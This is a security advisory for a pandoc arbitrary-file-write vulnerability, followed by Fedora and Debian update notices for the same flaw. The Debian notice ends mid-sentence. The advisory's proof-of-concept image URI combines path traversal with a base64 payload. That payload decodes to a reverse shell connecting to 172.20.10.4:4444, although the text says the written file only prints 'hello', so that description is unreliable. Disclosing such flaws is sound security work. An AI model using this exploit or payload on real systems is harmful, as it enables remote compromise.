# Arbitrary file write is possible when using PDF output or --extract-media with untrusted input

Moderate

[jgm](/jgm)
published
GHSA-xj5q-fv23-575g
Jul 3, 2023

## Package

pandoc
(Haskell)

## Affected versions

1.13 - 3.1.3

## Patched versions

3.1.4

## Description

### Impact

Pandoc is susceptible to an arbitrary file write vulnerability, which can be triggered by providing a specially crafted image element in the input when generating files using the `--extract-media` option or outputting to PDF format. This vulnerability allows an attacker to create or overwrite arbitrary files on the system (depending on the privileges of the process running pandoc).

This vulnerability only affects systems that (a) pass untrusted user input to pandoc and (b) allow pandoc to be used to produce a PDF or with the `--extract-media` option.

Here is a simple example:

b.md:

```
![](data://image/png;base64,b3MuZXhlY3V0ZSgicHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KChcIjE3Mi4yMC4xMC40XCIsNDQ0NCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtpbXBvcnQgcHR5OyBwdHkuc3Bhd24oXCIvYmluL2Jhc2hcIiknIik=;.lua+%2f%2e%2e%2f%2e%2e%2fa%2elua)

```

Running

```
pandoc b.md --extract-media=foo

```

will create a new file `a.lua` with contents `print "hello"` in the working directory. Any directory can be targeted by adding further percent-encoded directory components to the end of the URI.

The vulnerability exploits a flaw in the code pandoc uses to ensure that extracted media items are confined to the specified directory. For media from URIs and files that are not below the working directory, pandoc creates a file name based on the SHA1 of the contents and uses the original resource's extension as the extension. Prior to the patch, it obtained the extension by finding the last `.`, which in the case above includes `.lua+%2f%2e%2e%2f%2e%2e%2fa%2elua`. When the file is written to the file system, the percent-encoding is resolved, so the file written is `foo/2a0eaa89f43fada3e6c577beea4f2f8f53ab6a1d.lua+/../../a.lua`. In this way the exploit avoids the safeguards pandoc used to ensure that the extracted media is all confined to the specified directory (`foo`).

The fix is to unescape the percent-encoding prior to checking that the resource is not above the working directory, and prior to extracting the extension. Some code for checking that the path is below the working directory was flawed in a similar way and has also been fixed.

Note that the `--sandbox` option, which only affects IO done by readers and writers themselves, does not block this vulnerability.

### Patches

The vulnerability is patched in pandoc 3.1.4.

### Workarounds

Audit the pandoc command and disallow PDF output and the `--extract-media` option.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

Fedora Update Notification
FEDORA-2024-6ad6b9f417
2024-03-31 01:53:51.907786
--------------------------------------------------------------------------------

Name : pandoc
Product : Fedora 38
Version : 2.19.2
Release : 22.fc38
URL : <https://hackage.haskell.org/package/pandoc>
Summary : Conversion between markup formats
Description :
Pandoc is a Haskell library for converting from one markup format to another,
and a command-line tool that uses this library. The formats it can handle
include

- light markup formats (many variants of Markdown, reStructuredText, AsciiDoc,
Org-mode, Muse, Textile, txt2tags) - HTML formats (HTML 4 and 5) - Ebook
formats (EPUB v2 and v3, FB2) - Documentation formats (GNU TexInfo, Haddock) -
Roff formats (man, ms) - TeX formats (LaTeX, ConTeXt) - XML formats (DocBook 4
and 5, JATS, TEI Simple, OpenDocument) - Outline formats (OPML) - Bibliography
formats (BibTeX, BibLaTeX, CSL JSON, CSL YAML, RIS) - Word processor formats
(Docx, RTF, ODT) - Interactive notebook formats (Jupyter notebook ipynb) - Page
layout formats (InDesign ICML) - Wiki markup formats (MediaWiki, DokuWiki,
TikiWiki, TWiki, Vimwiki, XWiki, ZimWiki, Jira wiki, Creole) - Slide show
formats (LaTeX Beamer, PowerPoint, Slidy, reveal.js, Slideous, S5, DZSlides) -
Data formats (CSV and TSV tables) - PDF (via external programs such as pdflatex
or wkhtmltopdf)

Pandoc can convert mathematical content in documents between TeX, MathML, Word
equations, roff eqn, and plain text. It includes a powerful system for
automatic citations and bibliographies, and it can be customized extensively
using templates, filters, and custom readers and writers written in Lua.

For pdf output please also install pandoc-pdf or weasyprint.

Debian LTS Advisory DLA-3507-1                debian-lts@lists.debian.org

-------------------------------------------------------------------------

Package        : pandoc
Version        : 2.2.1-3+deb10u1
CVE ID         : CVE-2023-35936 CVE-2023-38745
Debian Bug     : 1041976

Arbitrary file write vulnerabilities were discovered in pandoc, an
Haskell library and CLI tool for converting from one markup format to
another.  These vulnerabilities can be triggered by providing a
specially crafted image element in the input when generating files using
the `--extract-media` option or outputting to PDF format, and allow an
attacker to create or overwrite arbitrary files on the system (depending
on the privileges of the process running pandoc).

CVE-2023-35936

    Entroy C discovered that appending percent-encoded directory
    components to the end of malicious data: URI, an attacker could
    trick pandoc into creating or or overwriting arbitrary files on the
    system.

CVE-2023-38745

    I discovered that the upstream fix for CVE-2023-35936 was
    incomplete, namely that the vulnerability remained when encoding '%'
    characters as '%25'.

For Debian 10 buster, these problems have been fixed in version
2.2.1-3+deb10u1.

We recommend that you upgrade your pandoc packages.

For the detailed security status of pandoc please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/pandoc>

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
